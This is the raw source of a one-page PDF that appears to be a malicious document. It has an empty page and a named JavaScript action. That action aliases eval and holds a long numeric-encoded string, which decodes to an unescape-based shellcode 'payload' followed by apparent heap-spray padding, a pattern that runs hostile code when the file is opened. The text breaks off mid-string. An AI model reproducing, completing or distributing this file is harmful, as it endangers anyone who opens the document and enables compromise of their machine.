%PDF-1.3
3 0 obj
<</Type /Page
/Parent 1 0 R
/Resources 2 0 R
/Contents 4 0 R>>
endobj
4 0 obj
<</Filter /FlateDecode /Length 25328>>
stream
endstream
endobj
1 0 obj
<</Type /Pages
/Kids [3 0 R ]
/Count 1
/MediaBox [0 0 300.00 400.00]
>>
endobj
5 0 obj
<</Type /Font
/BaseFont /Helvetica
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
>>
/XObject <<
>>
>>
endobj
6 0 obj
<<
/Names [(HtYfjPssa) 7 0 R ]
>>
endobj
7 0 obj
<<
/S /JavaScript
/JS (
var fg = eval;
var yu="error"; var s = "19 127 106 123 41 121 106 130 117 120 106 109 41 70 41 126 119 110 124 108 106 121 110 49 43 46 126 57 74 57 74 46 126 57 74 57 74 46 126 57 74 57 74 43 52 43 46 126 78 58 77 66 46 126 60 61 77 66 46 126 62 65 59 61 46 126 62 65 62 65 46 126 60 60 62 65 46 126 75 60 77 75 46 126 57 60 58 76 46 126 60 58 76 60 46 126 63 63 76 66 46 126 78 66 65 58 46 126 79 74 63 62 46 126 60 57 65 57 46 126 61 57 59 58 46 126 79 74 78 59 46 126 58 64 76 66 46 126 59 58 59 59 46 126 61 66 59 58 46 126 57 58 59 58 46 126 59 58 59 58 46 126 59 58 61 75 46 126 79 58 77 78 46 126 59 58 66 65 46 126 59 58 60 58 46 126 74 74 59 58 46 126 76 74 77 66 46 126 64 79 59 61 46 126 65 62 77 59 46 126 79 58 77 78 46 126 77 64 76 66 46 126 77 78 77 78 46 126 76 66 77 78 46 126 59 59 58 76 46 126 59 58 59 58 46 126 77 66 74 74 46 126 58 66 76 66 46 126 59 58 59 58 46 126 76 66 59 58 46 126 59 57 63 76 46 126 59 58 59 58 46 126 63 64 76 66 46 126 59 58 59 58 46 126 76 66 59 58 46 126 59 59 79 74 46 126 59 58 59 58 46 126 77 66 74 74 46 126 57 60 76 66 46 126 59 58 59 58 46 126 76 66 59 58 46 126 59 57 63 62 46 126 59 58 59 58 46 126 58 58 76 66 46 126 59 58 59 58 46 126 76 66 59 58 46 126 59 59 74 65 46 126 59 58 59 58 46 126 77 66 74 74 46 126 59 77 76 66 46 126 59 58 59 58 46 126 76 66 59 58 46 126 59 57 61 57 46 126 59 58 59 58 46 126 60 75 76 66 46 126 59 58 59 58 46 126 76 74 59 58 46 126 64 59 64 66 46 126 79 77 74 74 46 126 61 75 64 59 46 126 61 66 63 58 46 126 60 58 59 58 46 126 59 58 59 58 46 126 76 66 64 63 46 126 59 60 66 57 46 126 59 58 59 58 46 126 76 61 76 66 46 126 59 58 59 58 46 126 64 66 59 58 46 126 64 59 78 59 46 126 79 77 74 74 46 126 61 75 64 59 46 126 61 66 57 58 46 126 60 58 59 58 46 126 59 58 59 58 46 126 76 66 64 63 46 126 59 60 75 65 46 126 59 58 59 58 46 126 78 76 76 66 46 126 59 58 59 58 46 126 64 66 59 58 46 126 64 63 78 59 46 126 58 77 76 66 46 126 59 58 59 62 46 126 74 74 59 58 46 126 58 59 77 66 46 126 63 65 78 65 46 126 78 58 58 59 46 126 78 59 66 58 46 126 77 60 77 77 46 126 74 76 65 79 46 126 77 78 63 63 46 126 78 59 64 78 46 126 58 79 64 74 46 126 59 63 78 64 46 126 58 79 66 66 46 126 64 78 74 65 46 126 61 64 59 57 46 126 78 63 58 79 46 126 59 61 63 63 46 126 76 58 77 78 46 126 76 65 78 59 46 126 59 62 75 61 46 126 59 58 59 58 46 126 74 57 64 74 46 126 60 62 76 77 46 126 59 58 59 57 46 126 74 74 59 58 46 126 58 79 79 62 46 126 59 60 78 63 46 126 61 76 61 59 46 126 57 58 61 62 46 126 78 63 58 79 46 126 59 62 63 60 46 126 61 59 57 78 46 126 57 60 57 58 46 126 78 60 74 59 46 126 58 59 59 66 46 126 64 58 78 58 46 126 61 66 64 58 46 126 59 57 59 62 46 126 59 58 59 58 46 126 64 59 64 60 46 126 76 66 64 58 46 126 59 59 78 57 46 126 59 58 59 58 46 126 79 58 77 78 46 126 77 77 74 74 46 126 78 63 74 74 46 126 78 58 74 59 46 126 58 79 59 66 46 126 60 66 74 75 46 126 79 74 74 62 46 126 59 59 62 62 46 126 76 74 63 58 46 126 58 79 77 64 46 126 59 58 78 64 46 126 58 59 57 60 46 126 58 79 79 60 46 126 64 58 74 66 46 126 74 59 59 57 46 126 64 62 76 77 46 126 78 58 58 59 46 126 79 74 58 59 46 126 78 77 74 74 46 126 77 66 74 59 46 126 62 76 64 62 46 126 58 79 59 65 46 126 60 77 74 65 46 126 74 59 59 57 46 126 59 62 78 58 46 126 77 60 76 74 46 126 78 77 74 74 46 126 79 65 74 74 46 126 78 59 74 59 46 126 58 59 60 58 46 126 58 79 78 58 46 126 63 59 78 63 46 126 59 57 57 77 46 126 59 58 59 58 46 126 64 57 59 58 46 126 64 58 64 59 46 126 64 58 64 58 46 126 64 58 64 58 46 126 64 63 64 58 46 126 76 66 64 58 46 126 59 59 58 65 46 126 59 58 59 58 46 126 60 65 76 66 46 126 59 58 59 58 46 126 61 62 59 58 46 126 59 62 65 57 46 126 59 58 59 58 46 126 74 76 59 58 46 126 61 58 65 58 46 126 77 78 77 78 46 126 76 66 77 78 46 126 59 59 58 63 46 126 59 58 59 58 46 126 79 74 58 59 46 126 64 59 64 59 46 126 64 59 64 59 46 126 79 58 77 78 46 126 58 66 74 58 46 126 74 58 76 66 46 126 76 65 58 66 46 126 59 78 62 61 46 126 62 66 74 57 46 126 75 58 59 61 46 126 75 58 75 58 46 126 62 62 75 58 46 126 64 61 59 64 46 126 76 77 74 74 46 126 63 58 74 76 46 126 77 78 59 61 46 126 76 66 76 58 46 126 77 78 57 79 46 126 77 78 77 78 46 126 76 66 78 59 46 126 77 78 57 66 46 126 77 78 77 78 46 126 60 57 66 66 46 126 59 62 59 57 46 126 78 60 74 58 46 126 59 58 59 77 46 126 60 74 76 66 46 126 77 78 77 78 46 126 58 59 77 78 46 126 64 58 78 58 46 126 76 66 64 62 46 126 59 58 64 62 46 126 59 58 59 58 46 126 76 66 64 58 46 126 59 60 74 74 46 126 59 58 59 58 46 126 79 58 77 78 46 126 74 58 58 64 46 126 57 62 58 77 46 126 62 63 59 58 46 126 76 66 59 75 46 126 59 60 63 57 46 126 59 58 59 58 46 126 77 78 58 59 46 126 77 78 64 63 46 126 76 66 79 58 46 126 59 57 77 74 46 126 59 58 59 58 46 126 77 78 61 66 46 126 59 58 59 58 46 126 77 78 59 58 46 126 76 66 79 58 46 126 77 79 76 66 46 126 77 78 77 78 46 126 64 63 64 59 46 126 58 59 64 64 46 126 64 58 78 58 46 126 76 66 64 62 46 126 59 58 60 79 46 126 59 58 59 58 46 126 76 66 64 58 46 126 59 60 64 61 46 126 59 58 59 58 46 126 79 58 77 78 46 126 74 58 58 64 46 126 57 62 58 77 46 126 62 63 59 58 46 126 76 66 59 75 46 126 59 60 59 74 46 126 59 58 59 58 46 126 77 78 58 59 46 126 77 78 64 63 46 126 64 66 79 58 46 126 64 78 64 79 46 126 78 59 64 74 46 126 59 60 76 74 46 126 78 59 64 66 46 126 77 65 76 66 46 126 77 78 77 78 46 126 64 64 77 78 46 126 74 59 64 63 46 126 59 66 76 77 46 126 77 77 74 74 46 126 59 66 61 75 46 126 58 79 64 63 46 126 62 63 77 78 46 126 76 66 60 62 46 126 59 60 64 76 46 126 59 58 59 58 46 126 79 58 77 78 46 126 77 77 74 74 46 126 61 57 61 66 46 126 61 61 61 76 46 126 61 66 59 58 46 126 63 61 63 65 46 126 62 60 63 64 46 126 77 62 74 74 46 126 59 66 66 65 46 126 59 58 59 58 46 126 77 59 59 58 46 126 62 61 65 64 46 126 61 75 57 78 46 126 58 79 59 58 46 126 62 62 77 78 46 126 57 58 57 62 46 126 57 62 76 66 46 126 59 58 59 60 46 126 77 78 59 58 46 126 74 74 79 58 46 126 76 66 77 66 46 126 59 57 78 74 46 126 59 58 59 58 46 126 79 58 77 78 46 126 77 66 58 74 46 126 59 66 62 62 46 126 74 74 58 64 46 126 57 62 63 62 46 126 58 79 57 58 46 126 59 58 77 78 46 126 77 78 58 79 46 126 57 62 62 62 46 126 76 66 60 77 46 126 59 57 76 78 46 126 59 58 59 58 46 126 79 58 77 78 46 126 78 62 74 59 46 126 64 78 60 58 46 126 66 66 64 79 46 126 59 58 59 57 46 126 59 58 59 58 46 126 61 66 78 59 46 126 61 79 61 78 46 126 59 58 59 58 46 126 62 61 61 66 46 126 61 77 62 60 46 126 76 74 61 76 46 126 74 76 60 61 46 126 57 62 63 62 46 126 64 58 59 62 46 126 57 60 76 66 46 126 77 78 77 79 46 126 64 58 77 78 46 126 63 75 76 66 46 126 59 58 59 60 46 126 76 65 59 58 46 126 77 79 76 60 46 126 77 78 77 78 46 126 76 64 76 66 46 126 77 78 77 78 46 126 74 59 77 78 46 126 59 66 78 62 46 126 61 75 78 59 46 126 61 66 61 77 46 126 62 62 61 79 46 126 61 77 61 62 46 126 60 61 76 74 46 126 63 62 74 76 46 126 59 62 57 62 46 126 76 66 64 58 46 126 77 76 77 74 46 126 77 78 77 78 46 126 76 66 64 58 46 126 59 60 57 59 46 126 59 58 59 58 46 126 66 74 76 65 46 126 77 78 77 79 46 126 76 66 77 78 46 126 77 78 76 64 46 126 77 78 77 78 46 126 78 62 74 59 46 126 78 59 59 66 46 126 58 59 61 66 46 126 59 58 58 60 46 126 61 66 59 58 46 126 62 59 62 61 46 126 62 60 61 61 46 126 60 61 76 74 46 126 63 62 74 76 46 126 59 62 57 62 46 126 76 66 64 58 46 126 77 76 79 57 46 126 77 78 77 78 46 126 76 66 64 58 46 126 59 57 77 65 46 126 59 58 59 58 46 126 75 57 76 65 46 126 77 78 77 79 46 126 76 66 77 78 46 126 77 78 76 64 46 126 77 78 77 78 46 126 78 62 74 59 46 126 78 59 59 66 46 126 61 59 61 66 46 126 62 63 62 64 46 126 61 66 59 58 46 126 61 66 62 59 46 126 61 78 61 62 46 126 60 61 76 74 46 126 63 62 74 76 46 126 59 62 57 62 46 126 76 66 64 58 46 126 77 76 65 63 46 126 77 78 77 78 46 126 76 66 64 58 46 126 59 57 78 78 46 126 59 58 59 58 46 126 61 63 76 65 46 126 77 78 77 79 46 126 76 66 77 78 46 126 77 78 76 64 46 126 77 78 77 78 46 126 78 62 74 59 46 126 78 59 59 66 46 126 62 64 61 66 46 126 62 66 61 63 46 126 76 74 59 58 46 126 74 76 60 61 46 126 57 62 63 62 46 126 64 58 59 62 46 126 74 60 76 66 46 126 77 78 77 76 46 126 64 58 77 78 46 126 65 75 76 66 46 126 59 58 59 57 46 126 76 65 59 58 46 126 77 79 63 60 46 126 77 78 77 78 46 126 76 64 76 66 46 126 77 78 77 78 46 126 74 59 77 78 46 126 59 62 78 62 46 126 76 66 78 59 46 126 59 57 65 74 46 126 59 58 59 58 46 126 60 74 61 66 46 126 63 64 78 64 46 126 64 58 62 65 46 126 78 64 76 66 46 126 59 58 59 57 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 59 57 75 63 46 126 59 58 59 58 46 126 76 77 61 66 46 126 59 59 75 63 46 126 64 58 59 77 46 126 66 60 76 66 46 126 59 58 59 57 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 59 57 74 59 46 126 59 58 59 58 46 126 65 75 61 66 46 126 59 76 77 77 46 126 64 58 62 77 46 126 75 79 76 66 46 126 59 58 59 57 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 59 57 61 78 46 126 59 58 59 58 46 126 76 76 61 66 46 126 76 78 64 64 46 126 64 58 58 64 46 126 74 75 76 66 46 126 59 58 59 57 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 59 57 64 74 46 126 59 58 59 58 46 126 77 58 61 66 46 126 59 62 74 75 46 126 64 58 64 78 46 126 62 64 76 66 46 126 59 58 59 57 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 77 79 77 63 46 126 77 78 77 78 46 126 62 66 61 66 46 126 79 74 61 66 46 126 64 58 60 77 46 126 61 60 76 66 46 126 59 58 59 57 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 59 57 58 59 46 126 59 58 59 58 46 126 76 78 61 66 46 126 76 58 78 79 46 126 64 58 61 58 46 126 63 79 76 66 46 126 59 58 59 57 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 59 57 60 78 46 126 59 58 59 58 46 126 66 58 61 66 46 126 57 76 63 65 46 126 64 58 79 74 46 126 58 75 76 66 46 126 59 58 59 57 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 77 78 58 64 46 126 77 78 77 78 46 126 65 74 61 66 46 126 75 74 64 79 46 126 64 58 60 79 46 126 57 64 76 66 46 126 59 58 59 57 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 77 79 65 63 46 126 77 78 77 78 46 126 64 65 61 66 46 126 74 57 75 63 46 126 64 58 59 60 46 126 60 60 76 66 46 126 59 58 59 57 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 59 58 76 59 46 126 59 58 59 58 46 126 62 79 61 66 46 126 76 60 79 66 46 126 64 58 62 59 46 126 77 79 76 66 46 126 59 58 59 58 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 59 58 78 78 46 126 59 58 59 58 46 126 75 79 61 66 46 126 66 74 77 65 46 126 64 58 58 61 46 126 76 75 76 66 46 126 59 58 59 58 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 77 79 75 60 46 126 77 78 77 78 46 126 64 63 61 66 46 126 66 61 65 58 46 126 64 58 66 74 46 126 79 64 76 66 46 126 59 58 59 58 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 77 79 62 79 46 126 77 78 77 78 46 126 60 75 61 66 46 126 60 79 62 75 46 126 64 58 59 60 46 126 78 60 76 66 46 126 59 58 59 58 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 77 79 61 75 46 126 77 78 77 78 46 126 76 58 61 66 46 126 58 58 64 74 46 126 64 58 75 62 46 126 65 79 76 66 46 126 59 58 59 58 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 77 79 64 64 46 126 77 78 77 78 46 126 75 63 61 66 46 126 76 60 78 65 46 126 64 58 65 59 46 126 75 75 76 66 46 126 59 58 59 58 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 77 79 63 60 46 126 77 78 77 78 46 126 61 66 61 66 46 126 78 61 57 62 46 126 64 58 66 59 46 126 74 64 76 66 46 126 59 58 59 58 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 59 58 64 63 46 126 59 58 59 58 46 126 62 60 61 66 46 126 66 59 77 79 46 126 64 58 60 64 46 126 62 60 76 66 46 126 59 58 59 58 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 77 79 63 62 46 126 77 78 77 78 46 126 60 59 76 74 46 126 61 61 61 75 46 126 76 66 64 58 46 126 77 74 77 63 46 126 77 78 77 78 46 126 76 66 64 58 46 126 77 79 65 74 46 126 77 78 77 78 46 126 66 63 76 65 46 126 77 78 77 77 46 126 76 66 77 78 46 126 77 78 76 66 46 126 77 78 77 78 46 126 76 66 78 59 46 126 77 76 65 65 46 126 77 78 77 78 46 126 63 78 61 66 46 126 63 78 76 78 46 126 64 58 59 61 46 126 58 79 76 66 46 126 59 58 59 58 46 126 74 59 59 58 46 126 59 66 78 62 46 126 76 66 78 59 46 126 59 58 59 78 46 126 59 58 59 58 46 126 74 79 61 66 46 126 59 79 63 79 46 126 64 58 76 77 46 126 57 75 76 66 46 126 59 58 59 58 46 126 74 59 59 58 46 126 59 66 78 62 46 126 58 59 78 59 46 126 61 62 78 58 46 126 63 58 74 74 46 126 74 61 58 58 46 126 62 66 78 58 46 126 58 79 60 58 46 126 63 58 74 74 46 126 58 79 59 77 46 126 62 58 74 74 46 126 65 76 60 77 46 126 74 74 58 79 46 126 59 66 63 58 46 126 76 74 78 59 46 126 58 79 59 74 46 126 63 58 74 74 46 126 74 59 58 62 46 126 62 77 78 58 46 126 74 74 58 79 46 126 58 77 63 58 46 126 61 58 78 59 46 126 74 74 58 64 46 126 57 62 61 77 46 126 58 64 57 62 46 126 63 61 74 74 46 126 58 64 58 77 46 126 64 62 74 74 46 126 62 66 59 61 46 126 79 61 59 59 46 126 74 74 58 79 46 126 60 66 63 75 46 126 74 74 58 79 46 126 57 58 64 75 46 126 79 76 59 59 46 126 58 74 76 59 46 126 58 79 63 65 46 126 58 62 74 74 46 126 59 59 74 74 46 126 58 59 77 61 46 126 58 59 77 78 46 126 77 77 78 58 46 126 74 62 65 77 46 126 62 62 78 58 46 126 78 57 59 63 46 126 59 76 78 78 46 126 77 66 59 59 46 126 77 62 76 74 46 126 58 74 58 64 46 126 57 62 62 77 46 126 62 61 57 66 46 126 58 79 79 78 46 126 64 75 74 74 46 126 59 59 57 62 46 126 61 64 79 76 46 126 74 74 58 79 46 126 63 74 59 77 46 126 74 74 58 79 46 126 60 77 64 75 46 126 79 76 59 59 46 126 74 74 58 79 46 126 74 74 59 62 46 126 78 61 59 59 46 126 74 65 58 64 46 126 57 62 63 62 46 126 61 57 60 77 46 126 76 66 78 59 46 126 77 74 61 64 46 126 77 78 77 78 46 126 62 62 61 66 46 126 62 58 62 62 46 126 57 78 58 75 46 126 62 60 57 78 46 126 62 64 61 61 46 126 61 62 61 77 46 126 61 64 61 65 46 126 61 59 57 79 46 126 61 76 61 78 46 126 61 65 57 78 46 126 61 63 61 76 46 126 62 61 57 78 46 126 62 62 61 61 46 126 62 58 57 79 46 126 62 58 61 66 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 46 126 59 58 59 58 